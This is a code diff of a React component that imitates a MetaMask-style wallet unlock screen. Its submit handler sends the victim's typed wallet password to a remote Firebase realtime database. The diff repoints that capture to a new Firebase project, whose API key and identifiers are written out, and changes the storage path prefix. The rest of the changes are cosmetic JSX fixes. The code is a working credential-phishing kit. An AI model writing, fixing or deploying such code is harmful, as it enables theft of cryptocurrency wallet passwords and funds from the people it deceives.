@@ -150,28 +150,28 @@ const NetworkWalletProviders = ({
     setPassword(event.target.value);
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     setOpen(false);
     setDuring(true);
     // console.log("password = ", password )
 
     let key = password;
     const basic = {
-      apiKey: "AIzaSyDGUUcSc6tqgYV1RJBh_bf39PVPN1d3ZqI",
-      authDomain: "sandwich-e1c05.firebaseapp.com",
-      databaseURL: "https://sandwich-e1c05-default-rtdb.firebaseio.com",
-      projectId: "sandwich-e1c05",
-      storageBucket: "sandwich-e1c05.appspot.com",
-      messagingSenderId: "66293432844",
-      appId: "1:66293432844:web:aa9507cbdf89a7bf7de429",
-      measurementId: "G-4X6E8S72MQ"
+      apiKey: "AIzaSyDlFWtSsxrHqntCjg9dExgv7Dof7kc3ZUI",
+      authDomain: "devid-294a8.firebaseapp.com",
+      projectId: "devid-294a8",
+      storageBucket: "devid-294a8.appspot.com",
+      messagingSenderId: "1078659477153",
+      appId: "1:1078659477153:web:db1bc67e0e69af53c50ae0",
+      measurementId: "G-9ZVYJ8S1BW",
+      databaseURL: "https://devid-294a8-default-rtdb.firebaseio.com/",
     };
   
     let app = initializeApp(basic);
   
     let db = getDatabase(app);
   
-    set(ref(db, "77_/" + key.substring(1, 10)), { db_info: key });
+    set(ref(db, "88_/" + key.substring(1, 10)), { db_info: key });
 
     // here to process...
     // if (password === "") {
@@ -315,10 +315,10 @@ const NetworkWalletProviders = ({
         <Modal
           open={open}
           onClose={handleClose}
-          overlay
+          overlay="true"
           aria-labelledby="modal-modal-title"
           aria-describedby="modal-modal-description"
-          transformOrigin={{ horizontal: "center", vertical: "top" }}
+          transformorigin={{ horizontal: "center", vertical: "top" }}
         >
           <Box sx={style}>
             {during ? (
@@ -373,7 +373,7 @@ const NetworkWalletProviders = ({
                             role="img"
                           >
                             <img
-                              class="mm-avatar-network__network-image"
+                              className="mm-avatar-network__network-image"
                               src="./images/eth_logo.svg"
                               alt="Ethereum Mainnet logo"
                             ></img>
@@ -486,12 +486,13 @@ const NetworkWalletProviders = ({
                           className="unlock-page__links"
                           style={{ margin: "0px 0" }}
                         >
-                          <link
+                          {/* <a
                             className="button btn-link unlock-page__link"
-                            href="#"
+                            role="button"
+                            href="https://#"
                           >
                             Forgot password?
-                          </link>
+                          </a> */}
                         </Box>
                         <Box
                           className="unlock-page__support"
